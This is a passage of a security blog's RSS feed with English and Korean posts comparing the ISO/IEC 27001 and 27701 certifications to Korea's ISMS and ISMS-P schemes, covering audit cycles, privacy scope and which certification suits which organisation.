information security:</p><ul><li><strong>ISMS</strong> (Information Security Management System) focuses on information security only</li><li><strong>ISMS-P</strong> integrates <strong>privacy and information security</strong>, similar to ISO 27701 + 27001</li></ul><p>ISMS is mandatory for certain types of companies (e.g. cloud providers, major platforms), while ISMS-P is required for those handling large volumes of personal data or sensitive information.</p><p>Both certifications are administered by the <strong>Korea Internet &amp; Security Agency (KISA)</strong> and other regulatory bodies, and evaluate compliance with local laws like the Personal Information Protection Act (PIPA) and the Network Act.</p><hr><h2 id="&#x1F50D;-ISO-vs-ISMS-P-What&#x2019;s-the-difference"><a href="#&#x1F50D;-ISO-vs-ISMS-P-What&#x2019;s-the-difference" class="headerlink" title="&#x1F50D; ISO vs ISMS(P): What&#x2019;s the difference?"></a>&#x1F50D; ISO vs ISMS(P): What&#x2019;s the difference?</h2><p>While all these certifications help prove that your organization has a structured security system in place,</p><p>they differ in purpose, region, and legal applicability.</p><p><img src="/2025/03/27/romi0x/security_authentication_en/image5.png" alt="image"></p><hr><h2 id="So-which-one-should-you-choose"><a href="#So-which-one-should-you-choose" class="headerlink" title="So, which one should you choose?"></a>So, which one should you choose?</h2><ul><li><p>If you&#x2019;re <strong>expanding internationally</strong> or working with <strong>foreign partners</strong>,</p><p>&#x2192; Go with <strong>ISO/IEC 27001 + 27701</strong></p></li><li><p>If your focus is <strong>serving the Korean market</strong>,</p><p>&#x2192; Start with <strong>ISMS</strong>, and expand to <strong>ISMS-P</strong> if handling lots of personal data</p></li><li><p>Some organizations pursue <strong>both</strong>, but it&#x2019;s best to decide based on your audience, legal obligations, and business goals.</p></li></ul><hr><p>&#x1F517; Want to learn more about Korean security certifications?</p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/">https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/</a></p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/">https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/certification/">certification</category>
      
      <category domain="https://hackyboiz.github.io/tags/privacy/">privacy</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 국외 보안 인증제도(ISO/IEC) (ko)</title>
      <link>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_ko/</link>
      <guid>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_ko/</guid>
      <pubDate>Thu, 27 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, romi0x&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&amp;#x1F44B;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x25B3;&amp;#x25B3;&amp;#xAE30;&amp;#</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, romi0x&#xC785;&#xB2C8;&#xB2E4;.&#x1F44B;</p><blockquote><p><strong>&#x25B3;&#x25B3;&#xAE30;&#xC5C5;, ISO 27001 &#xC778;&#xC99D; &#xD68D;&#xB4DD;&#xC73C;&#xB85C; &#xC720;&#xB7FD; &#xC9C4;&#xCD9C; &#xAC00;&#xC18D;&#xD654;</strong></p><p><strong>OO&#xD074;&#xB77C;&#xC6B0;&#xB4DC;, APEC &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xC778;&#xC99D; &#x2018;CBPR&#x2019; &#xCDE8;&#xB4DD;</strong></p><p><strong>&#xAD6D;&#xB0B4; &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5;, ISO 27701 &#xC778;&#xC99D;&#xC73C;&#xB85C; GDPR &#xB300;&#xC751; &#xAE30;&#xBC18; &#xB9C8;&#xB828;</strong></p></blockquote><p>&#xC774;&#xB7F0; &#xB274;&#xC2A4; &#xD5E4;&#xB4DC;&#xB77C;&#xC778;, &#xD55C; &#xBC88;&#xCBE4; &#xBCF4;&#xC2E0; &#xC801; &#xC788;&#xC9C0; &#xC54A;&#xB098;&#xC694;?</p><p>&#xAE00;&#xB85C;&#xBC8C; &#xC2DC;&#xC7A5;&#xC5D0; &#xC9C4;&#xCD9C;&#xD558;&#xAC70;&#xB098; &#xC678;&#xAD6D;&#xACC4; &#xAE30;&#xC5C5;&#xACFC; &#xD611;&#xB825;&#xD558;&#xB824;&#xB294; &#xAE30;&#xC5C5;&#xC774;&#xB77C;&#xBA74;, &#xAD6D;&#xC81C; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC5D0; &#xB300;&#xD574; &#xD55C; &#xBC88;&#xCBE4; &#xB4E4;&#xC5B4;&#xBCF4;&#xC168;&#xC744; &#xAC81;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xC720;&#xB7FD;&#xC758; GDPR, &#xBBF8;&#xAD6D;&#xC758; CCPA, &#xC77C;&#xBCF8;&#xB7;&#xC2F1;&#xAC00;&#xD3EC;&#xB974;&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xC774;&#xC804; &#xC694;&#xAC74; &#xB4F1; &#xAD6D;&#xAC00;&#xBCC4; &#xADDC;&#xC81C;&#xAC00; &#xB2E4;&#xC591;&#xD654;&#xB418;&#xBA74;&#xC11C;, &#xC774;&#xB97C; &#xCCB4;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xB300;&#xC751;&#xD560; &#xC218; &#xC788;&#xB294; &#xC778;&#xC99D; &#xC81C;&#xB3C4;&#xC758; &#xC911;&#xC694;&#xC131;&#xC774; &#xCEE4;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xAD6D;&#xC81C;&#xC801;&#xC778; &#xBCF4;&#xC548; &#xC778;&#xC99D; &#xC81C;&#xB3C4;&#xC778; <strong>ISO/IEC 27001, ISO/IEC 27701</strong>&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xB85C;! &#xAD6D;&#xB0B4; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;&#xAC00; &#xAD81;&#xAE08;&#xD558;&#xB2E4;&#xBA74;, &#xC544;&#xB798; &#xBE14;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC138;&#xC694;~</p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/">Part1. &#xAD6D;&#xB0B4; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;- &#xC815;&#xBCF4;&#xBCF4;&#xD638;</a></p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/">Part2. &#xAD6D;&#xB0B4; &#xBCF4;&#xC548; &#xC778;&#xC99D;&#xC81C;&#xB3C4;- &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &amp; &#xD074;&#xB77C;&#xC6B0;&#xB4DC;</a></p><hr><h2 id="ISO-IEC"><a href="#ISO-IEC" class="headerlink" title="ISO/IEC?"></a>ISO/IEC?</h2><p><img src="/2025/03/27/romi0x/security_authentication_ko/image.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xBA3C;&#xC800;, ISO&#xC5D0; &#xB300;&#xD574; &#xC18C;&#xAC1C;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><p>ISO &#xC778;&#xC99D;&#xC740; <strong>&#xAD6D;&#xC81C;&#xD45C;&#xC900;&#xD654;&#xAE30;&#xAD6C;(ISO)&#xAC00; &#xAC1C;&#xBC1C;&#xD55C; &#xD45C;&#xC900;&#xC5D0; &#xB530;&#xB978; &#xC778;&#xC99D;</strong>&#xC73C;&#xB85C;, &#xAE30;&#xC5C5;&#xC758; &#xACBD;&#xC601;&#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xAD6D;&#xC81C; &#xD45C;&#xC900;&#xC5D0; &#xC801;&#xD569;&#xD558;&#xAC8C; &#xAD6C;&#xCD95;&#xB418;&#xC5B4; &#xC788;&#xC74C;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xB294; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>ISO&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xC5D0; &#xC778;&#xC99D;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xACE0; &#xC788;&#xB294;&#xB370;&#xC694;, &#xADF8; &#xC911;&#xC5D0; &#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xC778;&#xC99D;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC778;&#xC99D;&#xB4E4;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>ISO/IEC 27001</strong> - <strong>&#xC815;&#xBCF4;&#xBCF4;&#xC548; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;</strong></p></li><li><p><strong>ISO/IEC 27002</strong> - <strong>&#xC815;&#xBCF4;&#xBCF4;&#xC548; &#xD1B5;&#xC81C; &#xC9C0;&#xCE68;</strong></p></li><li><p><strong>ISO/IEC 27017</strong> - <strong>&#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xBCF4;&#xC548; &#xC9C0;&#xCE68;</strong></p></li><li><p><strong>ISO/IEC 27018</strong> - <strong>&#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638; &#xAC00;&#xC774;&#xB4DC;&#xB77C;&#xC778;</strong></p></li><li><p><strong>ISO/IEC 27701</strong> - <strong>&#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;</strong></p></li><li><p><strong>ISO/IEC 27005</strong> - <strong>&#xC815;&#xBCF4;&#xBCF4;&#xC548; &#xB9AC;&#xC2A4;&#xD06C; &#xAD00;&#xB9AC;</strong></p></li><li><p><strong>ISO/IEC 22301</strong> - <strong>&#xBE44;&#xC988;&#xB2C8;&#xC2A4; &#xC5F0;&#xC18D;&#xC131; &#xAD00;&#xB9AC;</strong></p></li></ol><p>&#xBCF4;&#xD1B5; &#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xACFC; &#xAD00;&#xB828;&#xD55C; &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xACE0;&#xC790;&#xD558;&#xB294; &#xAE30;&#xC5C5;&#xB4E4;&#xC740; 27001 (&#xC815;&#xBCF4;&#xBCF4;&#xC548;)&#xC744; &#xAE30;&#xBCF8;&#xC73C;&#xB85C;, 27701 (&#xAC1C;&#xC778;&#xC815;&#xBCF4;),27017/27018 (&#xD074;&#xB77C;&#xC6B0;&#xB4DC;)&#xB4F1;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC11C; &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="ISO-IEC-27001"><a href="#ISO-IEC-27001" class="headerlink" title="ISO/IEC 27001"></a>ISO/IEC 27001</h2><p><strong>ISO/IEC 27001&#xC740; &#xAD6D;&#xC81C;&#xD45C;&#xC900;&#xD654;&#xAE30;&#xAD6C;(ISO)&#xC640; &#xAD6D;&#xC81C;&#xC804;&#xAE30;&#xAE30;&#xC220;&#xC704;&#xC6D0;&#xD68C;(IEC)&#xAC00; &#xACF5;&#xB3D9;&#xC73C;&#xB85C; &#xC81C;&#xC815;&#xD55C; &#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xACBD;&#xC601;&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB300;&#xD55C; &#xAD6D;&#xC81C; &#xD45C;&#xC900;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD45C;&#xC900;&#xC740; &#xC870;&#xC9C1;&#xC758; &#xC815;&#xBCF4; &#xC790;&#xC0B0;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xACE0;, &#xBCF4;&#xC548; &#xC704;&#xD611;&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xAE30;&#xBC00;&#xC131;, &#xBB34;&#xACB0;&#xC131;, &#xAC00;&#xC6A9;&#xC131;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xCCB4;&#xACC4;&#xC801;&#xC778; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC591;&#xD55C; &#xC720;&#xD615;&#xC758; &#xC870;&#xC9C1;(&#xAE30;&#xC5C5;, &#xACF5;&#xACF5;&#xAE30;&#xAD00;, &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC0AC;&#xC5C5;&#xC790; &#xB4F1;)&#xC774; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xB9AC;&#xC2A4;&#xD06C;&#xB97C; &#xC2DD;&#xBCC4;, &#xD3C9;&#xAC00;, &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xBA70;, &#xADF8; &#xC801;&#xD569;&#xC131;&#xC744; &#xC678;&#xBD80; &#xC778;&#xC99D;&#xC744; &#xD1B5;&#xD574; &#xC785;&#xC99D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC778;&#xC99D;&#xC740; &#xC804; &#xC138;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xD1B5;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xC720;&#xB7FD;, &#xBD81;&#xBBF8;, &#xC544;&#xC2DC;&#xC544; &#xB4F1; &#xC5D0;&#xC11C;&#xB294; ISO/IEC 27001 &#xC778;&#xC99D;&#xC774; &#xC2E0;&#xB8B0;&#xC758; &#xAE30;&#xC900;&#xC774; &#xB418;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><p>ISO 27001&#xC740; &#xC870;&#xC9C1;&#xC774; &#xC5C5;&#xBB34;, &#xC7A5;&#xC18C;, &#xC790;&#xC0B0;&#xACFC; &#xAE30;&#xC220;&#xC801; &#xD2B9;&#xC131;&#xC744; &#xACE0;&#xB824;&#xD574; &#xBC18;&#xC601;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xBA70;, &#xC774;&#xB294; &#xACC4;&#xD68D;(Plan), &#xC2E4;&#xD589;(Do), &#xC810;&#xAC80;(Check), &#xC870;&#xCE58;(Act)&#xC778; PDCA &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC21C;&#xD658;&#xC801;&#xC778; &#xD65C;&#xB3D9;&#xC758; &#xC811;&#xADFC; &#xBC29;&#xBC95;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/27/romi0x/security_authentication_ko/image2.png" alt="&#xC0AC;&#xC9C4;"><br>&#xCD9C;&#xCC98;: <a href="https://cdn.standards.iteh.ai/samples/79612/fc6152007e5648b2b175c1e9c2b4a553/ISO-28000-2022.pdf">https://cdn.standards.iteh.ai/samples/79612/fc6152007e5648b2b175c1e9c2b4a553/ISO-28000-2022.pdf</a></p><p>ISO/IEC 27001&#xC740; &#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD56D;&#xBAA9;&#xC73C;&#xB85C; &#xB098;&#xB220; &#xC2EC;&#xC0AC;&#xC640; &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/27/romi0x/security_authentication_ko/image3.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xC2EC;&#xC0AC;&#xB294; &#xAD6D;&#xC81C; &#xC778;&#xC99D;&#xAE30;&#xAD00;&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA70;, &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xC740; &#xD6C4;&#xC5D0;&#xB294; <strong>1&#xB144;&#xC5D0; 1&#xD68C; &#xC774;&#xC0C1; &#xC0AC;&#xD6C4; &#xC2EC;&#xC0AC;</strong>, <strong>3&#xB144;&#xC5D0; 1&#xD68C; &#xAC31;&#xC2E0; &#xC2EC;&#xC0AC;</strong>&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC0AC;&#xD6C4; &#xC2EC;&#xC0AC;&#xC5D0;&#xC11C;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC720;&#xC9C0; &#xBC0F; &#xAC1C;&#xC120; &#xC5EC;&#xBD80;, &#xC8FC;&#xC694; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D; &#xBC18;&#xC601; &#xC5EC;&#xBD80; &#xB4F1;&#xC744; &#xD3C9;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="ISO-IEC-27701"><a href="#ISO-IEC-27701" class="headerlink" title="ISO/IEC 27701"></a>ISO/IEC 27701</h2><p>ISO/IEC 27701&#xC740; &#xAE30;&#xC874;&#xC758; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4;&#xC778; ISO/IEC 27001&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xBA70;, &#xAC1C;&#xC778;&#xC815;&#xBCF4;(PII: Personally Identifiable Information)&#xC758; &#xC218;&#xC9D1;, &#xCC98;&#xB9AC;, &#xC800;&#xC7A5;, &#xD30C;&#xAE30; &#xB4F1; &#xC804; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xC758; &#xBCF4;&#xD638; &#xBC0F; &#xAD00;&#xB9AC; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC744; &#xCD94;&#xAC00;&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. <strong>&#xC989;, ISO 27701&#xC740; ISO 27001 + &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xD655;&#xC7A5;&#xD310;&#xC774;&#xB77C;&#xACE0; &#xBCF4;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</strong></p><p>ISO/IEC 27701&#xC758; &#xC8FC;&#xC694; &#xBAA9;&#xC801;&#xC740; &#xC870;&#xC9C1;&#xC774; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;, &#xC800;&#xC7A5;, &#xCC98;&#xB9AC;, &#xC774;&#xC804;, &#xC0AD;&#xC81C;&#xD558;&#xB294; &#xC804; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xAD00;&#xB828; &#xBC95;&#xADDC;(GDPR, CCPA &#xB4F1;)&#xB97C; &#xD6A8;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC900;&#xC218;&#xD558;&#xACE0;, &#xC815;&#xBCF4;&#xC8FC;&#xCCB4;&#xC758; &#xAD8C;&#xB9AC;&#xB97C; &#xBCF4;&#xD638;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xCCB4;&#xACC4;&#xC801;&#xC778; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4;&#xB97C; &#xC218;&#xB9BD;&#xD558;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>ISO/IEC 27701&#xC740; &#xB2E8;&#xB3C5;&#xC73C;&#xB85C; &#xC778;&#xC99D; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xD45C;&#xC900;&#xC740; &#xC544;&#xB2C8;&#xBA70;, &#xBC18;&#xB4DC;&#xC2DC; ISO/IEC 27001 &#xC778;&#xC99D;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD568;&#xAED8; &#xC2EC;&#xC0AC;&#xBC1B;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC989;, ISO/IEC 27001 &#xC778;&#xC99D;&#xC744; &#xD68D;&#xB4DD;&#xD55C; &#xC870;&#xC9C1;&#xC774; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; ISO/IEC 27701 &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC744; &#xCDA9;&#xC871;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638; &#xC5ED;&#xB7C9;&#xC744; &#xACF5;&#xC2DD;&#xC801;&#xC73C;&#xB85C; &#xC778;&#xC815;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; ISO/IEC 27001&#xC758; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xD1B5;&#xC81C; &#xD56D;&#xBAA9;&#xACFC; &#xD568;&#xAED8; ISO/IEC 27701&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xD55C; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xD1B5;&#xC81C; &#xD56D;&#xBAA9;&#xB4E4;&#xC774; &#xD1B5;&#xD569;&#xC801;&#xC73C;&#xB85C; &#xC2EC;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/27/romi0x/security_authentication_ko/image4.png" alt="&#xC0AC;&#xC9C4;"></p><p>ISO/IEC 27701&#xC740; GDPR, CCPA, APPI(&#xC77C;&#xBCF8;), PDPA(&#xC2F1;&#xAC00;&#xD3EC;&#xB974;) &#xB4F1; &#xC8FC;&#xC694; &#xAD6D;&#xAC00;&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xBC95; &#xB300;&#xC751; &#xCCB4;&#xACC4;&#xB85C; &#xD65C;&#xC6A9;&#xB418;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><p>ISO/IEC 27701 &#xC8FC;&#xC694; &#xD2B9;&#xC9D5;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;:</p><ul><li>&#xAE30;&#xC874; ISO/IEC 27001&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xC694;&#xAD6C; &#xC0AC;&#xD56D;&#xACFC; &#xAC00;&#xC774;&#xB4DC;&#xB77C;&#xC778;&#xC744; &#xD55C;&#xCE35; &#xAC15;&#xD654;</li><li>PII &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xC640; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; &#xC870;&#xC9C1;&#xC774; &#xAC16;&#xCD94;&#xC5B4;&#xC57C; &#xD558;&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC744; &#xD3EC;&#xD568;</li><li>EU GDPR &#xC900;&#xC218;&#xB97C; &#xC5FC;&#xB450;&#xC5D0; &#xB450;&#xACE0; &#xC81C;&#xC815;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ISO/IEC 27701&#xACFC; GDPR &#xADDC;&#xC815; &#xAC04; &#xB9F5;&#xD551;&#xC744; &#xC81C;&#xACF5;</li><li>ISO/IEC 27001&#xC758; &#xD655;&#xC7A5;&#xD310;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ISO/IEC 27701 &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xAE30; &#xC6D0;&#xD558;&#xB294; &#xAE30;&#xC5C5;&#xC740; ISO/IEC 27001 &#xC778;&#xC99D;&#xC744; &#xBCF4;&#xC720;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC57C; &#xD568;</li></ul><h2 id="ISO-vs-ISMS-P-&#xBB34;&#xC5C7;&#xC774;-&#xB2E4;&#xB97C;&#xAE4C;"><a href="#ISO-vs-ISMS-P-&#xBB34;&#xC5C7;&#xC774;-&#xB2E4;&#xB97C;&#xAE4C;" class="headerlink" title="ISO vs ISMS(P), &#xBB34;&#xC5C7;&#xC774; &#xB2E4;&#xB97C;&#xAE4C;?"></a>ISO vs ISMS(P), &#xBB34;&#xC5C7;&#xC774; &#xB2E4;&#xB97C;&#xAE4C;?</h2><p>&#xB450; &#xC778;&#xC99D; &#xBAA8;&#xB450; &#xC870;&#xC9C1;&#xC774; &#xCCB4;&#xACC4;&#xC801;&#xC778; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xAC16;&#xCD94;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xC785;&#xC99D;&#xD560; &#xC218; &#xC788;&#xB294; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC801;&#xC6A9; &#xBC94;&#xC704;&#xC640; &#xBAA9;&#xC801;&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ISO/IEC 27001&#xC740; &#xC804; &#xC138;&#xACC4;&#xC5D0;&#xC11C; &#xC778;&#xC815;&#xB418;&#xB294; &#xAD6D;&#xC81C; &#xC778;&#xC99D;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xC678; &#xC0AC;&#xC5C5;, &#xB2E4;&#xAD6D;&#xC801; &#xACE0;&#xAC1D; &#xB300;&#xC751;&#xC5D0; &#xC720;&#xB9AC;&#xD558;&#xBA70;, &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xBB38;&#xC11C; &#xC911;&#xC2EC;&#xC758; &#xD45C;&#xC900;&#xD654;&#xB41C; &#xC811;&#xADFC;&#xC744; &#xC694;&#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBC18;&#xBA74;, &#xD55C;&#xAD6D;&#xC758; ISMS&#xB294; &#xAD6D;&#xB0B4; &#xBC95;&#xB839;&#xACFC; &#xADDC;&#xC815;&#xC744; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xC2EC;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA70;, &#xC2E4;&#xC81C; &#xC6B4;&#xC601; &#xBC0F; &#xC2E4;&#xBB34; &#xC911;&#xC2EC;&#xC758; &#xC810;&#xAC80;&#xC774; &#xAC15;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; ISO&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638;&#xB97C; &#xBCC4;&#xB3C4;&#xB85C; &#xD655;&#xC7A5;&#xD574;&#xC57C; &#xD558;&#xB294; &#xBC18;&#xBA74;, ISMS&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAE4C;&#xC9C0; &#xD1B5;&#xD569;&#xD55C; ISMS-P&#xB77C;&#xB294; &#xC778;&#xC99D;&#xCCB4;&#xACC4;&#xB97C; &#xC6B4;&#xC601;&#xD558;&#xACE0; &#xC788;&#xC5B4; &#xAD6D;&#xB0B4; &#xD658;&#xACBD;&#xC5D0; &#xB354; &#xC801;&#xD569;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; <strong>ISO/IEC 27001</strong>, <strong>ISMS</strong>, <strong>ISMS-P</strong> &#xC138; &#xAC00;&#xC9C0; &#xC778;&#xC99D;&#xC744; &#xBE44;&#xAD50;&#xD55C; &#xD45C;&#xC785;&#xB2C8;&#xB2E4;. &#xAC01; &#xC778;&#xC99D;&#xC758; &#xD2B9;&#xC9D5;, &#xC801;&#xC6A9; &#xB300;&#xC0C1;, &#xC778;&#xC99D; &#xBC94;&#xC704; &#xB4F1;&#xC744; &#xD55C;&#xB208;&#xC5D0; &#xBCF4;&#xAE30; &#xC27D;&#xAC8C; &#xC815;&#xB9AC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/27/romi0x/security_authentication_ko/image5.png" alt="&#xC0AC;&#xC9C4;"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
